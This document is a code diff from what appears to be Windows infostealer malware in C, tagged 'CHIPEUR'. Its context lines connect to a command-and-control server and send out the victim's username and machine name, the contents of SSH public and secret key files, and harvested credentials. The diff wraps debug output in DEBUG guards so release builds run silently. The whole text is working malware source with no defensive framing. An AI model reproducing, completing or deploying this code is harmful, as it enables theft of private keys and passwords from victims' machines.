@@ -21,9 +21,11 @@ BOOL connect_to_c2(SOCKET *sock) {
   WSADATA wsaData = {0};
   err = WSAStartup(MAKEWORD(2, 2), &wsaData);
   if (err != 0) {
+#ifdef DEBUG
     printf(
         "DEBUG: connect_to_c2: Error while loading winsocker.dll: Error %d\n",
         err);
+#endif
     return FALSE;
   }
 
@@ -31,8 +33,10 @@ BOOL connect_to_c2(SOCKET *sock) {
   *sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
   if (*sock == INVALID_SOCKET) {
     err = WSAGetLastError();
+#ifdef DEBUG
     printf("DEBUG: connect_to_c2: Error while creating the socket: Error %d\n",
            err);
+#endif
     return FALSE;
   }
 
@@ -45,11 +49,15 @@ BOOL connect_to_c2(SOCKET *sock) {
   // connecting to the c2 server
   err = connect(*sock, (SOCKADDR *)&client, sizeof(client));
   if (err == SOCKET_ERROR) {
+#ifdef DEBUG
     printf("DEBUG: connect_to_c2: Error while creating the client: Error %d\n",
            WSAGetLastError());
+#endif
     return FALSE;
   }
+#ifdef DEBUG
   printf("INFO: connect_to_c2: Successfully connected to the c2 server\n");
+#endif
   return TRUE;
 }
 
@@ -57,9 +65,11 @@ static BOOL close_c2_conn(SOCKET *sock) {
   // closing the server
   int err = closesocket(*sock);
   if (err == SOCKET_ERROR) {
+#ifdef DEBUG
     printf(
         "DEBUG: close_c2_conn: Error while closing the connection: Error %d\n",
         WSAGetLastError());
+#endif
     return FALSE;
   }
   return TRUE;
@@ -78,28 +88,36 @@ static PWSTR get_header(void) {
 
   err = GetComputerNameW(machineName, &lenMachineName);
   if (err == 0) {
+#ifdef DEBUG
     printf("DEBUG: get_header: Error while getting the machine name. %d\n",
            GetLastError());
+#endif
   }
   err = GetUserNameW(userName, &lenUserName);
   if (err == 0) {
+#ifdef DEBUG
     printf("DEBUG: get_header: Error while getting the username. %d\n",
            GetLastError());
+#endif
   }
 
   // computing the full header
   int realSize = _snwprintf(fullName, lenFullName, L"[CHIPEUR]|%ls@%ls|",
                             userName, machineName);
   if (realSize == -1) {
+#ifdef DEBUG
     fprintf(stderr,
             "DEBUG: get_header: Error while creating the header username\n");
+#endif
     return NULL;
   }
 
   PWSTR header = _wcsdup(fullName);
   if (header == NULL) {
+#ifdef DEBUG
     fprintf(stderr,
             "DEBUG: get_header: Error while allocating the header username\n");
+#endif
   }
 
   return header;
@@ -116,10 +134,14 @@ static BOOL send_file(const PWSTR filename, SOCKET *sock) {
   hFile = CreateFileW(filename, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 
   if (hFile == INVALID_HANDLE_VALUE) {
+#ifdef DEBUG
     wprintf(L"DEBUG: send_file: Error, couldn't open %ls file.\n", filename);
+#endif
     return FALSE;
   }
+#ifdef DEBUG
   wprintf(L"DEBUG: send_file: Opening '%ls' file.\n", filename);
+#endif
   // reading 1024 bytes block
   do {
     result = ReadFile(hFile, buffer, sizeof(buffer), &bytesRead, NULL);
@@ -129,7 +151,9 @@ static BOOL send_file(const PWSTR filename, SOCKET *sock) {
 
     int err = send(*sock, buffer, bytesRead, 0);
     if (err == SOCKET_ERROR){
+#ifdef DEBUG
         fwprintf(stderr, L"DEBUG: send_file: Error, couldn't send a part of the file %ls: %d\n", filename, GetLastError());
+#endif
         return FALSE;
     }
 
@@ -160,7 +184,9 @@ BOOL send_ssh_key(sshKey keysTab[MAX_KEY_FILES], DWORD32 lenKeysTab,
         lenHeadTypeFname = wcslen(header) + wcslen(keysTab[i].publicKeyPath) + 6;
         headTypeFname = malloc(sizeof(WCHAR) * (lenHeadTypeFname + 1));
         if (headTypeFname == NULL) {
+#ifdef DEBUG
             fwprintf(stderr, L"DEBUG: send_ssh_key: Error, couldn't allocate the full header\n");
+#endif
             free(header);
             return FALSE;
         }
@@ -170,25 +196,33 @@ BOOL send_ssh_key(sshKey keysTab[MAX_KEY_FILES], DWORD32 lenKeysTab,
         int err = send(*sock, (char *)headTypeFname, sizeof(WCHAR) * lenHeadTypeFname, 0);
         wprintf(L"headtypefname = %ls\n", headTypeFname);
         if (err == SOCKET_ERROR) {
+#ifdef DEBUG
             fwprintf(stderr, L"DEBUG: send_ssh_key: Couldn't send header: %d\n", GetLastError());
+#endif
             free(headTypeFname);
             free(header);
             return FALSE;
         }
         // sending the ssh public key
         if (send_file(keysTab[i].publicKeyPath, sock) == FALSE) {
+#ifdef DEBUG
             fwprintf(stderr, L"DEBUG: send_ssh_key: Couldn't send file '%ls'\n", keysTab[i].publicKeyPath);
+#endif
             success = FALSE;
         }
         // sending the tail of the request
         err = send(*sock, "[RUEPIHC]\n", sizeof(char) * 11, 0);
         if (err == SOCKET_ERROR) {
+#ifdef DEBUG
             fwprintf(stderr, L"DEBUG: send_ssh_key: Couldn't send end of request: %d\n", GetLastError());
+#endif
             free(headTypeFname);
             free(header);
             return FALSE;
         }
+#ifdef DEBUG
         wprintf(L"DEBUG: send_ssh_keys: File '%ls' sent with success\n", keysTab[i].publicKeyPath);
+#endif
         free(headTypeFname);
     }
     // Doing the same but for the secret key filename
@@ -196,35 +230,44 @@ BOOL send_ssh_key(sshKey keysTab[MAX_KEY_FILES], DWORD32 lenKeysTab,
         lenHeadTypeFname = wcslen(header) + wcslen(keysTab[i].secretKeyPath) + 6;
         headTypeFname = malloc(sizeof(WCHAR) * (lenHeadTypeFname + 1));
         if (headTypeFname == NULL) {
+#ifdef DEBUG
             fwprintf(stderr, L"DEBUG: send_ssh_key: Error, couldn't allocate the full header\n");
+#endif
             free(header);
             return FALSE;
         }
 
         headTypeFname[lenHeadTypeFname] = L'\0';
         _snwprintf(headTypeFname, lenHeadTypeFname, L"%ls%ls%ls|", header, datatype, keysTab[i].secretKeyPath);
-        wprintf(L"headtypefname = %ls\n", headTypeFname);
         int err = send(*sock, (char *)headTypeFname, sizeof(WCHAR) * lenHeadTypeFname, 0);
         if (err == SOCKET_ERROR) {
+#ifdef DEBUG
             fwprintf(stderr, L"DEBUG: send_ssh_key: Couldn't send header: %d\n", GetLastError());
+#endif
             free(headTypeFname);
             free(header);
             return FALSE;
         }
         // sending the ssh secret file
         if (send_file(keysTab[i].secretKeyPath, sock) == FALSE) {
+#ifdef DEBUG
             fwprintf(stderr, L"DEBUG: send_ssh_key: Couldn't send file '%ls'\n", keysTab[i].secretKeyPath);
+#endif
             success = FALSE;
         }
         // senfing the tail of the request
         err = send(*sock, "[RUEPIHC]\n", sizeof(char) * 11, 0);
         if (err == SOCKET_ERROR) {
+#ifdef DEBUG
             fwprintf(stderr, L"DEBUG: send_ssh_key: Couldn't send end of request: %d\n", GetLastError());
+#endif
             free(headTypeFname);
             free(header);
             return FALSE;
         }
+#ifdef DEBUG
         wprintf(L"DEBUG: send_ssh_keys: File '%ls' sent with success\n", keysTab[i].secretKeyPath);
+#endif
         free(headTypeFname);
     }
   }
@@ -242,7 +285,9 @@ BOOL send_credentials(SOCKET * sock, Credential * credTab, DWORD32 lenCredTab){
   size_t lenHeadType = lenHeader + 13 + 1;
   PWSTR headType = malloc(sizeof(WCHAR) * lenHeadType);
   if (headType == NULL){
+#ifdef DEBUG
     fprintf(stderr, "DEBUG: send_credentials: Error, couldn't allocate the headType");
+#endif
     free(header);
     return FALSE;
   }
@@ -252,7 +297,9 @@ BOOL send_credentials(SOCKET * sock, Credential * credTab, DWORD32 lenCredTab){
   free(header);
   int err = send(*sock, (char *)headType, lenHeadType * 2, 0);
   if (err == SOCKET_ERROR){
+#ifdef DEBUG
     fwprintf(stderr, L"DEBUG: send_credentials: Couldn't send header: %d\n", GetLastError());
+#endif
     free(headType);
   }
   free(headType);
@@ -264,7 +311,9 @@ BOOL send_credentials(SOCKET * sock, Credential * credTab, DWORD32 lenCredTab){
     credToSend = malloc(sizeof(char) * (lenCredToSend + 1));
     credToSend[lenCredToSend] = 0;
     if (credToSend == NULL){
+#ifdef DEBUG
       fwprintf(stderr, L"DEBUG: send_credentials: Couldn't allocate credentials to send\n");
+#endif
       break;
     }
 
@@ -272,7 +321,9 @@ BOOL send_credentials(SOCKET * sock, Credential * credTab, DWORD32 lenCredTab){
     err = send(*sock, credToSend, lenCredToSend, 0);
     free(credToSend);
     if (err == SOCKET_ERROR){
+#ifdef DEBUG
       fwprintf(stderr, L"DEBUG: send_credentials: Couldn't send header: %d\n", GetLastError());
+#endif
       break;
     }
   }
@@ -280,9 +331,13 @@ BOOL send_credentials(SOCKET * sock, Credential * credTab, DWORD32 lenCredTab){
   // sending the tail of the request
   err = send(*sock, "[RUEPIHC]\n", sizeof(char) * 11, 0);
   if (err == SOCKET_ERROR) {
+#ifdef DEBUG
       fwprintf(stderr, L"DEBUG: send_credentials: Couldn't send end of request: %d\n", GetLastError());
+#endif
       return FALSE;
   }
+#ifdef DEBUG
   printf("DEBUG: send_credentials: Credentials sent successfully\n");
+#endif
   return TRUE;
 }
